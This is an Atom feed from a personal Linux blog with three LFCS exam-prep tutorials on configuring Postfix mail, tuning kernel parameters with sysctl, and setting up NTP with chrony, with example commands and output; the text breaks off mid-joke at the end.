<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-02-17T12:41:34-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Configure an SMTP mail service]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/17/lfcs-prep-configure-an-smtp-mail-service/"/>
    <updated>2018-02-17T12:16:33-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/17/lfcs-prep-configure-an-smtp-mail-service</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at configuring a mail service for LFCS objectives. We&rsquo;ll use the Postfix implementation that already comes preinstalled  on CentOS.</p>

<!-- more -->


<p>The configuration file with all Postfix parameters is <code>/etc/postfix/main.cf</code> and it is massive. Instead of manually editing it, it&rsquo;s easier to use <strong>postconf</strong>. Without arguments, it displays all parameters. If given a parameter name, it will show that parameter&rsquo;s value, and with the <strong>-e</strong> flag it can modify parameters.</p>

<p>Another important file for mail configuration is <code>/etc/aliases</code>. If you want a mail destined to a user to be delivered to another user, you can set an alias:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>username: alias </span></code></pre></td></tr></table></div></figure>


<p>The alias will get the mails destined for the user. I&rsquo;ve added an alias on my system so that root&rsquo;s mail will be delivered to nixhat:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root: nixhat</span></code></pre></td></tr></table></div></figure>


<p>After changing any alias settings, you have to refresh the alias DB with the command <code>postalias /etc/aliases</code></p>

<p>Now it&rsquo;s time to edit some parameters in order to setup a working mail configuration.</p>

<ul>
<li>The <strong>myorigin</strong> parameter specifies the domain that locally-posted mail appears to come from</li>
</ul>


<p>The default is to use the hostname for this, but I will change it to use just the domain (example.com in this case)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf -e 'myorigin=$mydomain'
</span><span class='line'>[root@centos ~]# postconf myorigin
</span><span class='line'>myorigin = $mydomain</span></code></pre></td></tr></table></div></figure>


<ul>
<li>The <strong>inet_interfaces</strong> parameter specifies the network interface addresses that this mail system receives mail on</li>
</ul>


<p>Here I have mine listening on the Ethernet interface in addition to localhost:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf inet_interfaces
</span><span class='line'>inet_interfaces = 192.168.217.131, localhost</span></code></pre></td></tr></table></div></figure>


<ul>
<li>The <strong>relayhost</strong> parameter specifies the default host to send mail to when no entry is matched in the optional transport(5) table. When no relayhost is given, mail is routed directly to the destination. On an intranet, specify the organizational domain name. In the case of SMTP, specify a domain, host, host:port, [host]:port, [address] or [address]:port; the form [host] turns off MX lookups.</li>
</ul>


<p>If you want to forward mail to a central host, use the <strong>relayhost</strong> parameter</p>

<ul>
<li>The <strong>mydestination</strong> parameter specifies the list of domains that this machine considers itself the final destination for. This parameter is important for receiving messages</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf mydestination
</span><span class='line'>mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain</span></code></pre></td></tr></table></div></figure>


<ul>
<li>The <strong>mynetworks</strong> parameter specifies the list of &ldquo;trusted&rdquo; SMTP clients that are allowed to relay mail through Postfix. It can allow clients on the local subnet, in a range, just a host, or manually specified.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf mynetworks
</span><span class='line'>mynetworks = 192.168.217.0/24 127.0.0.0/8 [::1]/128</span></code></pre></td></tr></table></div></figure>


<h2>Restricting access to the server</h2>

<p>For receiving mail, you can add some settings to harden the security of your server:</p>

<ul>
<li><strong>smtpd_helo_required</strong> &ndash; Require that a remote SMTP client sends HELO or EHLO before commencing a MAIL transaction</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf smtpd_helo_required
</span><span class='line'>smtpd_helo_required = yes</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>smtpd_helo_restrictions</strong> &ndash; other optional restrictions:</li>
</ul>


<p><strong>permit_mynetworks</strong> &ndash; Permit the request when the client IP address matches any network or network address listed in $mynetworks</p>

<p> <strong>reject_invalid_helo_hostname</strong> &ndash; Reject the request when the HELO or EHLO hostname is malformed</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf smtpd_helo_restrictions
</span><span class='line'>smtpd_helo_restrictions = permit_mynetworks, reject_invalid_helo_hostname</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>smtpd_sender_restrictions</strong> &ndash; Optional restrictions that the Postfix SMTP server applies in the context of a client MAIL FROM command:</li>
</ul>


<p><strong>reject_unknown_sender_domain</strong> &ndash; Reject the request when Postfix is not final destination for the sender address, and the MAIL FROM domain has 1) no DNS MX and no DNS A record, or 2) a malformed MX record such as a record with a zero-length MX hostname</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf smtpd_sender_restrictions
</span><span class='line'>smtpd_sender_restrictions = permit_mynetworks, reject_unknown_sender_domain</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>smtpd_recipient_restrictions</strong> &ndash; Optional restrictions that the Postfix SMTP server applies in the context of a client RCPT TO command</li>
</ul>


<p><strong>reject_unauth_destination</strong> &ndash; reject the request unless 1) Postfix is the mail forwarder; or 2) Postfix is the final destination</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>postconf smtpd_recipient_restrictions
</span><span class='line'>smtpd_recipient_restrictions = permit_mynetworks, reject_unauth_destination</span></code></pre></td></tr></table></div></figure>


<p>After changing Postfix settings, it is a good idea to run <code>postfix check</code> to check the validity of the config file. Then restart Postfix.</p>

<p>Now to test it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo "This is a test" | mail -s "test" root@example.com</span></code></pre></td></tr></table></div></figure>


<p>On user nixhat:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mail
</span><span class='line'>Heirloom Mail version 12.5 7/5/10.  Type ? for help.
</span><span class='line'>"/var/spool/mail/nixhat": 1 message 1 new
</span><span class='line'>&gt;N  1 root                  Sat Feb 17 18:08  18/569   "test"
</span><span class='line'>cat  /var/spool/mail/nixhat
</span><span class='line'>From root@example.com  Sat Feb 17 18:08:09 2018
</span><span class='line'>Return-Path: &lt;root@example.com&gt;
</span><span class='line'>X-Original-To: root@example.com
</span><span class='line'>Delivered-To: root@example.com
</span><span class='line'>Received: by centos.example.com (Postfix, from userid 0)
</span><span class='line'>  id 51255218FED7; Sat, 17 Feb 2018 18:08:09 +0200 (EET)
</span><span class='line'>Date: Sat, 17 Feb 2018 18:08:09 +0200
</span><span class='line'>To: root@example.com
</span><span class='line'>Subject: test
</span><span class='line'>User-Agent: Heirloom mailx 12.5 7/5/10
</span><span class='line'>MIME-Version: 1.0
</span><span class='line'>Content-Type: text/plain; charset=us-ascii
</span><span class='line'>Content-Transfer-Encoding: 7bit
</span><span class='line'>Message-Id: &lt;20180217160809.51255218FED7@centos.example.com&gt;
</span><span class='line'>From: root@example.com (root)
</span><span class='line'>Status: O
</span><span class='line'>
</span><span class='line'>This is a test</span></code></pre></td></tr></table></div></figure>


<p>So it works. If you want to see more about the status of your mails, look inside <code>/var/log/maillog</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Feb 17 18:21:11 centos postfix/pickup[8896]: 4FADF218FED8: uid=0 from=&lt;root&gt;
</span><span class='line'>Feb 17 18:21:11 centos postfix/cleanup[9359]: 4FADF218FED8: message-id=&lt;20180217162111.4FADF218FED8@centos.example.com&gt;
</span><span class='line'>Feb 17 18:21:11 centos postfix/qmgr[8897]: 4FADF218FED8: from=&lt;root@example.com&gt;, size=431, nrcpt=1 (queue active)
</span><span class='line'>Feb 17 18:21:11 centos postfix/local[9361]: 4FADF218FED8: to=&lt;nixhat@example.com&gt;, orig_to=&lt;root@example.com&gt;, relay=local, delay=0.08, delays=0.07/0.02/0/0, dsn=2.0.0, status=sent (delivered to mailbox)
</span><span class='line'>Feb 17 18:21:11 centos postfix/qmgr[8897]: 4FADF218FED8: removed</span></code></pre></td></tr></table></div></figure>


<p>Some other useful actions with mail would be to view the mail queue with <strong>mailq</strong> and flush the queue with <strong>postfix flush</strong></p>

<p>Also see <strong>man 5 postconf</strong> for all Postfix parameters</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Q: What lies on the bottom of the ocean \
</span><span class='line'>\ and twitches? A: A nervous wreck.       /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Changing kernel parameters]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/15/lfcs-prep-changing-kernel-parameters/"/>
    <updated>2018-02-15T13:28:47-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/15/lfcs-prep-changing-kernel-parameters</id>
    <content type="html"><![CDATA[<p>In this post we&rsquo;ll look at changing kernel parameters both at runtime and at boot. Such changes can be made with the <strong>sysctl</strong> command or by inputting values in different files inside <code>/proc/sys</code></p>

<!-- more -->


<p>Let&rsquo;s see a sample /proc/sys folder, which can differ between systems:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /proc/sys
</span><span class='line'>abi  crypto  debug  dev  fs  kernel  net  sunrpc  vm</span></code></pre></td></tr></table></div></figure>


<p>The most important entries are:</p>

<ul>
<li><p>dev contains parameters for system devices</p></li>
<li><p>fs contains filesystem parameters</p></li>
<li><p>kernel is used for kernel parameters</p></li>
<li><p>net contains network parameters</p></li>
<li><p>vm contains virtual memory parameters</p></li>
</ul>


<p>To modify runtime parameters, we can use <strong>sysctl</strong>. Let&rsquo;s take a look at all the available parameters:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sysctl -a | wc -l
</span><span class='line'>951</span></code></pre></td></tr></table></div></figure>


<p>Too many to list here, so let&rsquo;s glance over a few random ipv4 parameters:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sysctl -a | grep net.ipv4 | tail
</span><span class='line'>net.ipv4.tcp_tso_win_divisor = 3
</span><span class='line'>net.ipv4.tcp_tw_recycle = 0
</span><span class='line'>net.ipv4.tcp_tw_reuse = 0
</span><span class='line'>net.ipv4.tcp_window_scaling = 1
</span><span class='line'>net.ipv4.tcp_wmem = 4096    16384    4194304
</span><span class='line'>net.ipv4.tcp_workaround_signed_windows = 0
</span><span class='line'>net.ipv4.udp_mem = 43428    57905    86856
</span><span class='line'>net.ipv4.udp_rmem_min = 4096
</span><span class='line'>net.ipv4.udp_wmem_min = 4096
</span><span class='line'>net.ipv4.xfrm4_gc_thresh = 32768</span></code></pre></td></tr></table></div></figure>


<p>The dots in the options represent actual slashes in the directory structure under /proc/sys. Now let&rsquo;s take a value and modify it. I will use the packet forwarding feature for this example</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /proc/sys/net/ipv4/ip_forward
</span><span class='line'>1</span></code></pre></td></tr></table></div></figure>


<p>So the system is configured to forward packets as a router. To change this, we can put a 0 value in the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo 0 &gt; /proc/sys/net/ipv4/ip_forward</span></code></pre></td></tr></table></div></figure>


<p>Another option is to write a value with sysctl. Here I enable IP forwarding again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sysctl -w net.ipv4.ip_forward=1
</span><span class='line'>net.ipv4.ip_forward = 1</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Changes made in this way won&rsquo;t persist a reboot. To make them permanent, you have to edit the configuration file.
This used to be <code>/etc/sysctl.conf</code> , and can still be used, but newer systems look for config files inside <strong>/etc/sysctl.d/</strong>, <strong>/run/sysctl.d/</strong>, and <strong>/usr/lib/sysctl.d/</strong> (in order of precedence). On such systems, you can modify the <code>/usr/lib/sysctl.d/00-system</code> file for your kernel settings.</p>

<p>I edited mine to disable IP forwarding:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Disable IP forwarding
</span><span class='line'>net.ipv4.ip_forward = 0</span></code></pre></td></tr></table></div></figure>


<p>If you don&rsquo;t want to reboot, you can have sysctl re-read its config files by doing <strong>sysctl -p</strong> with the config file of your choice (by default, it will read <strong>/etc/sysctl.conf</strong>)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> sysctl -p /usr/lib/sysctl.d/00-system.conf 
</span><span class='line'>net.ipv4.ip_forward = 0
</span><span class='line'>cat /proc/sys/net/ipv4/ip_forward
</span><span class='line'>0</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ______________________________________
</span><span class='line'>/ You're definitely on their list. The \
</span><span class='line'>| question to ask next is what list it |
</span><span class='line'>\ is.                                  /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - NTP configuration]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/14/lfcs-prep-ntp-configuration/"/>
    <updated>2018-02-14T14:50:41-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/14/lfcs-prep-ntp-configuration</id>
    <content type="html"><![CDATA[<p>In this post we&rsquo;ll look at NTP configuration by using chrony, which is installed by default on newer RedHat systems.</p>

<!-- more -->


<p>Ensure that the <strong>chronyd</strong> service is started and let&rsquo;s take a look at the current time setttings:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl
</span><span class='line'>      Local time: Thu 2018-02-15 02:15:51 JST
</span><span class='line'>  Universal time: Wed 2018-02-14 17:15:51 UTC
</span><span class='line'>        RTC time: Wed 2018-02-14 17:15:52
</span><span class='line'>       Time zone: Asia/Tokyo (JST, +0900)
</span><span class='line'>     NTP enabled: no
</span><span class='line'>NTP synchronized: no
</span><span class='line'> RTC in local TZ: no
</span><span class='line'>      DST active: n/a</span></code></pre></td></tr></table></div></figure>


<p>Now look inside chrony&rsquo;s config file, which is <code>/etc/chrony.conf</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Use public servers from the pool.ntp.org project.
</span><span class='line'># Please consider joining the pool (http://www.pool.ntp.org/join.html).
</span><span class='line'>server 0.rhel.pool.ntp.org iburst
</span><span class='line'>server 1.rhel.pool.ntp.org iburst
</span><span class='line'>server 2.rhel.pool.ntp.org iburst
</span><span class='line'>server 3.rhel.pool.ntp.org iburst
</span><span class='line'>
</span><span class='line'># Ignore stratum in source selection.
</span><span class='line'>stratumweight 0
</span><span class='line'>
</span><span class='line'># Record the rate at which the system clock gains/losses time.
</span><span class='line'>driftfile /var/lib/chrony/drift
</span><span class='line'>
</span><span class='line'># Enable kernel RTC synchronization.
</span><span class='line'>rtcsync
</span><span class='line'>
</span><span class='line'># In first three updates step the system clock instead of slew
</span><span class='line'># if the adjustment is larger than 10 seconds.
</span><span class='line'>makestep 10 3
</span><span class='line'>
</span><span class='line'># Allow NTP client access from local network.
</span><span class='line'>#allow 192.168/16
</span><span class='line'>
</span><span class='line'># Listen for commands only on localhost.
</span><span class='line'>bindcmdaddress 127.0.0.1
</span><span class='line'>bindcmdaddress ::1
</span><span class='line'>
</span><span class='line'># Serve time even if not synchronized to any NTP server.
</span><span class='line'>#local stratum 10
</span><span class='line'>
</span><span class='line'>keyfile /etc/chrony.keys
</span><span class='line'>
</span><span class='line'># Specify the key used as password for chronyc.
</span><span class='line'>commandkey 1
</span><span class='line'>
</span><span class='line'># Generate command key if missing.
</span><span class='line'>generatecommandkey
</span><span class='line'>
</span><span class='line'># Disable logging of client accesses.
</span><span class='line'>noclientlog
</span><span class='line'>
</span><span class='line'># Send a message to syslog if a clock adjustment is larger than 0.5 seconds.
</span><span class='line'>logchange 0.5
</span><span class='line'>
</span><span class='line'>logdir /var/log/chrony
</span><span class='line'>#log measurements statistics tracking</span></code></pre></td></tr></table></div></figure>


<p>There is a set of default servers configured, but you can add your own. You can also allow NTP client access in the local network by uncommenting or adding the <strong>allow</strong> directive with a range.</p>

<p>In the previous timedatectl output we saw that NTP and synchronization weren&rsquo;t enabled, so let&rsquo;s enable them:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl set-ntp 1
</span><span class='line'>timedatectl | grep -i ntp
</span><span class='line'>     NTP enabled: yes
</span><span class='line'>NTP synchronized: no</span></code></pre></td></tr></table></div></figure>


<p>We still have to manage the NTP synchronization. In the config file we have some server pools enabled, but we want to know exact names for the servers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chronyc sources -v
</span><span class='line'>210 Number of sources = 4
</span><span class='line'>
</span><span class='line'>  .-- Source mode  '^' = server, '=' = peer, '#' = local clock.
</span><span class='line'> / .- Source state '*' = current synced, '+' = combined , '-' = not combined,
</span><span class='line'>| /   '?' = unreachable, 'x' = time may be in error, '~' = time too variable.
</span><span class='line'>||                                                 .- xxxx [ yyyy ] +/- zzzz
</span><span class='line'>||      Reachability register (octal) -.           |  xxxx = adjusted offset,
</span><span class='line'>||      Log2(Polling interval) --.      |          |  yyyy = measured offset,
</span><span class='line'>||                                \     |          |  zzzz = estimated error.
</span><span class='line'>||                                 |    |           \
</span><span class='line'>MS Name/IP address         Stratum Poll Reach LastRx Last sample
</span><span class='line'>===============================================================================
</span><span class='line'>^? ts1.sct.de                    0   8     0   10y     +0ns[   +0ns] +/-    0ns
</span><span class='line'>^? greenstone-quarry.the-jad     0   8     0   10y     +0ns[   +0ns] +/-    0ns
</span><span class='line'>^? 1b.ncomputers.org             0   8     0   10y     +0ns[   +0ns] +/-    0ns
</span><span class='line'>^? shout.ovh                     0   8     0   10y     +0ns[   +0ns] +/-    0ns</span></code></pre></td></tr></table></div></figure>


<p>Now we can pick a server to synchronize with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ntpdate -vd ts1.sct.de
</span><span class='line'>15 Feb 02:37:52 ntpdate[9511]: ntpdate 4.2.6p5@1.2349-o Wed Mar  1 09:00:52 UTC 2017 (1)
</span><span class='line'>Looking for host ts1.sct.de and service ntp
</span><span class='line'>host found : ts1.sct.de
</span><span class='line'>transmit(193.141.27.1)
</span><span class='line'>receive(193.141.27.1)
</span><span class='line'>transmit(193.141.27.1)
</span><span class='line'>receive(193.141.27.1)
</span><span class='line'>transmit(193.141.27.1)
</span><span class='line'>receive(193.141.27.1)
</span><span class='line'>transmit(193.141.27.1)
</span><span class='line'>receive(193.141.27.1)
</span><span class='line'>server 193.141.27.1, port 123
</span><span class='line'>stratum 2, precision -24, leap 00, trust 000
</span><span class='line'>refid [193.141.27.1], delay 0.07736, dispersion 0.00209
</span><span class='line'>transmitted 4, in filter 4
</span><span class='line'>reference time:    de2ec48b.aba7efb5  Wed, Feb 14 2018 23:22:03.670
</span><span class='line'>originate timestamp: de2ec847.3cbf5eb1  Wed, Feb 14 2018 23:37:59.237
</span><span class='line'>transmit timestamp:  de2ef276.d94d8084  Thu, Feb 15 2018  2:37:58.848
</span><span class='line'>filter delay:  0.07916  0.07736  0.08383  0.07954 
</span><span class='line'>         0.00000  0.00000  0.00000  0.00000 
</span><span class='line'>filter offset: -10799.6 -10799.6 -10799.6 -10799.6
</span><span class='line'>         0.000000 0.000000 0.000000 0.000000
</span><span class='line'>delay 0.07736, dispersion 0.00209
</span><span class='line'>offset -10799.642908
</span><span class='line'>
</span><span class='line'>15 Feb 02:37:58 ntpdate[9511]: step time server 193.141.27.1 offset -10799.642908 sec</span></code></pre></td></tr></table></div></figure>


<p>To get more information about the NTP status, check the tracking:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chronyc tracking
</span><span class='line'>Reference ID    : 193.141.27.1 (ts1.sct.de)
</span><span class='line'>Stratum         : 3
</span><span class='line'>Ref time (UTC)  : Wed Feb 14 14:41:11 2018
</span><span class='line'>System time     : 0.000000000 seconds fast of NTP time
</span><span class='line'>Last offset     : +10799.637695312 seconds
</span><span class='line'>RMS offset      : 10799.637695312 seconds
</span><span class='line'>Frequency       : 0.000 ppm fast
</span><span class='line'>Residual freq   : -1.456 ppm
</span><span class='line'>Skew            : 1000000.000 ppm
</span><span class='line'>Root delay      : 0.069487 seconds
</span><span class='line'>Root dispersion : 1528.844971 seconds
</span><span class='line'>Update interval : 0.0 seconds
</span><span class='line'>Leap status     : Normal</span></code></pre></td></tr></table></div></figure>


<p>You can see the server in the Reference ID and the Leap status that confirms the synchronization. Also re-check with timedatectl that NTP is working:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl | grep -i ntp
</span><span class='line'>     NTP enabled: yes
</span><span class='line'>NTP synchronized: yes</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Give thought to your reputation.       \
